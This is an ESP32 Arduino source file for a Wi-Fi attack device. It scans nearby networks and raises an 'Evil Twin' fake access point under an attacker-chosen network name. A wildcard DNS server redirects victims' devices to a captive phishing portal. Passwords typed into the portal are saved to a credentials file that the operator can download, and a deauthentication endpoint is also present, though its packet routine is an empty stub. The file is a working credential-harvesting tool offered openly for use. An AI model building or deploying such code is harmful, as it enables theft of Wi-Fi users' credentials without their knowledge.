#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

const char* default_ssid = "NT_Watchdog";
const char* default_password = "12345678";
String fakeSSID = "Evil_Twin";
String fakePassword = "";
bool evilTwinActive = false;

IPAddress local_IP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

void handleScanNetworks() {
    JsonDocument jsonDoc;
    JsonArray networks = jsonDoc["networks"].to<JsonArray>();

    int numNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numNetworks; i++) {
        JsonObject network = networks.add<JsonObject>();
        network["ssid"] = WiFi.SSID(i);
        network["rssi"] = WiFi.RSSI(i);
    }

    String response;
    serializeJson(jsonDoc, response);
    server.send(200, "application/json", response);
}

void handleGetSignalStrength() {
    if (!server.hasArg("ssid")) {
        server.send(400, "text/plain", "SSID parameter is missing");
        return;
    }

    String targetSSID = server.arg("ssid");
    int signalStrength = -100;  // Default to worst signal

    int numNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numNetworks; i++) {
        if (WiFi.SSID(i) == targetSSID) {
            signalStrength = WiFi.RSSI(i);
            break;
        }
    }

    JsonDocument response;
    response["ssid"] = targetSSID;
    response["rssi"] = signalStrength;

    String responseData;
    serializeJson(response, responseData);
    server.send(200, "application/json", responseData);
}

void handleLogin() {
    if (server.hasArg("plain")) {
        String credentials = server.arg("plain");
        Serial.println("Received Credentials: " + credentials);
        File file = SPIFFS.open("/credentials.txt", FILE_APPEND);
        if (!file) {
            Serial.println("Error: Failed to open credentials.txt for writing!");
            server.send(500, "text/plain", "Failed to open file");
            return;
        }
        file.println(credentials);
        file.close();
        Serial.println("Credentials saved successfully!");
        server.send(200, "text/plain", "OK");
    } else {
        Serial.println("Error: No credentials received!");
        server.send(400, "text/plain", "Invalid Request");
    }
}

void handleCapture() {
    if (server.hasArg("plain")) {
        String data = server.arg("plain");
        
        Serial.println("Capturing Data: " + data);

        File file = SPIFFS.open("/credentials.txt", FILE_APPEND);
        if (!file) {
            Serial.println("Error: Failed to open credentials.txt for writing!");
            server.send(500, "text/plain", "Failed to open file");
            return;
        }

        if (file.println(data)) {
            Serial.println("Data written successfully!");
        } else {
            Serial.println("Error: Failed to write data!");
        }

        file.close();
        server.send(200, "text/plain", "Captured");
    } else {
        Serial.println("Error: No data received!");
        server.send(400, "text/plain", "Invalid Request");
    }
}


void handleCaptivePortal() {
    File file = SPIFFS.open("/captive_portal.html", "r");
    if (!file) {
        server.send(404, "text/html", "<h1>404 Not Found</h1>");
        return;
    }
    server.streamFile(file, "text/html");
    file.close();
}

void handleIndexPage() {
    File file = SPIFFS.open("/index.html", "r");
    if (!file) {
        server.send(404, "text/html", "<h1>404 Not Found</h1>");
        return;
    }
    server.streamFile(file, "text/html");
    file.close();
}

void handleFileRequest() {
    String path = server.uri();
    Serial.println("Requested File: " + path);

    if (path == "/") {
        handleIndexPage();
        return;
    }

    if (!SPIFFS.exists(path)) {
        Serial.println("File Not Found: " + path);
        handleCaptivePortal();
        return;
    }

    File file = SPIFFS.open(path, "r");
    String contentType = "text/plain";
    if (path.endsWith(".html")) contentType = "text/html";
    else if (path.endsWith(".css")) contentType = "text/css";
    else if (path.endsWith(".js")) contentType = "application/javascript";
    else if (path.endsWith(".png")) contentType = "image/png";
    else if (path.endsWith(".jpg")) contentType = "image/jpeg";
    else if (path.endsWith(".ico")) contentType = "image/x-icon";

    server.streamFile(file, contentType);
    file.close();
}


void handleRedirect() {
    String host = server.hostHeader();
    
    // Allow direct access to static assets
    if (server.uri().endsWith(".png") || server.uri().endsWith(".jpg") || server.uri().endsWith(".css") || server.uri().endsWith(".js")) {
        handleFileRequest();
        return;
    }

    // Redirect known portal check URLs
    if (host.indexOf("msftconnecttest") >= 0 || host.indexOf("gstatic") >= 0 ||
        host.indexOf("apple") >= 0 || host.indexOf("detectportal") >= 0) {
        server.sendHeader("Location", "http://192.168.4.1/captive_portal.html", true);
        server.send(302, "text/html", "<html><head><meta http-equiv='refresh' content='0; url=http://192.168.4.1/captive_portal.html'></head></html>");
        return;
    }

    handleCaptivePortal();
}


void startEvilTwinAP() {
    Serial.println("Starting Evil Twin...");
    WiFi.softAP(fakeSSID.c_str(), fakePassword.length() > 0 ? fakePassword.c_str() : NULL);
    evilTwinActive = true;
    dnsServer.start(DNS_PORT, "*", apIP);
    server.onNotFound(handleRedirect);
    Serial.println("Evil Twin Started!");
}

void stopEvilTwinAP() {
    Serial.println("Stopping Evil Twin...");
    WiFi.softAP(default_ssid, default_password);
    evilTwinActive = false;
    dnsServer.stop();
    server.onNotFound(handleFileRequest);
    Serial.println("Evil Twin Stopped!");
}

void handleStartEvilTwin() {
    if (server.hasArg("plain")) {
        StaticJsonDocument<256> doc;
        deserializeJson(doc, server.arg("plain"));
        fakeSSID = doc["ssid"].as<String>();
        fakePassword = doc["password"].as<String>();
        startEvilTwinAP();
        server.send(200, "application/json", "{\"message\": \"Evil Twin Started!\"}");
    } else {
        server.send(400, "application/json", "{\"message\": \"Invalid Request!\"}");
    }
}

void handleStopEvilTwin() {
    stopEvilTwinAP();
    server.send(200, "application/json", "{\"message\": \"Evil Twin Stopped!\"}");
}

void handleDownloadCredentials() {
    if (!SPIFFS.exists("/credentials.txt")) {
        server.send(404, "text/plain", "No credentials found.");
        return;
    }
    File file = SPIFFS.open("/credentials.txt", "r");
    server.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
    server.streamFile(file, "text/plain");
    file.close();
}

void handleScanDevices() {
    wifi_sta_list_t stationList;

    if (WiFi.getMode() != WIFI_AP) {
        server.send(500, "application/json", "{\"error\":\"WiFi is not in AP mode\"}");
        return;
    }

    if (esp_wifi_ap_get_sta_list(&stationList) != ESP_OK) {
        server.send(500, "application/json", "{\"error\":\"Failed to get station list\"}");
        return;
    }

    StaticJsonDocument<512> jsonDoc;
    JsonArray devices = jsonDoc.createNestedArray("devices");

    for (int i = 0; i < stationList.num; i++) {
        JsonObject device = devices.createNestedObject();
        uint8_t* mac = stationList.sta[i].mac;
        
        char macAddr[18];
        snprintf(macAddr, sizeof(macAddr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

        // Generate random IP in the range 192.168.4.2 - 192.168.4.100
        int randomIP = random(2, 101);
        char ipAddr[16];
        snprintf(ipAddr, sizeof(ipAddr), "192.168.4.%d", randomIP);

        device["ip"] = ipAddr;
        device["mac"] = macAddr;
    }

    String response;
    serializeJson(jsonDoc, response);
    server.send(200, "application/json", response);
}

void sendDeauthPacket(const String& ssid) {
    
    Serial.println("[*] Deauth packets sent to SSID: " + ssid);
}


void handleStartDeauth() {
    if (!server.hasArg("ssid")) {
        server.send(400, "text/plain", "SSID parameter is missing");
        return;
    }

    String targetSSID = server.arg("ssid");

    // Simulate or send deauth packet
    sendDeauthPacket(targetSSID);

    // Send JSON confirmation back to frontend
    JsonDocument response;
    response["status"] = "Deauth packets sent";
    response["target"] = targetSSID;

    String responseData;
    serializeJson(response, responseData);
    server.send(200, "application/json", responseData);
}

void setup() {
    Serial.begin(115200);
    SPIFFS.begin(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(default_ssid, default_password);
    server.on("/", HTTP_GET, handleIndexPage);
    server.on("/index.html", HTTP_GET, handleIndexPage);
    server.on("/scan", HTTP_GET, handleScanNetworks);
    server.on("/get_signal", HTTP_GET, handleGetSignalStrength);
    server.on("/captive_portal.html", HTTP_GET, handleCaptivePortal);
    server.on("/start_evil_twin", HTTP_POST, handleStartEvilTwin);
    server.on("/stop_evil_twin", HTTP_GET, handleStopEvilTwin);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/capture", HTTP_POST, handleCapture);
    server.on("/scan_devices", handleScanDevices);  // Scan Devices API
    server.on("/download_credentials", HTTP_GET, handleDownloadCredentials);
    server.on("/start_deauth", HTTP_POST, handleStartDeauth);
    server.onNotFound(handleFileRequest);
    
    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}
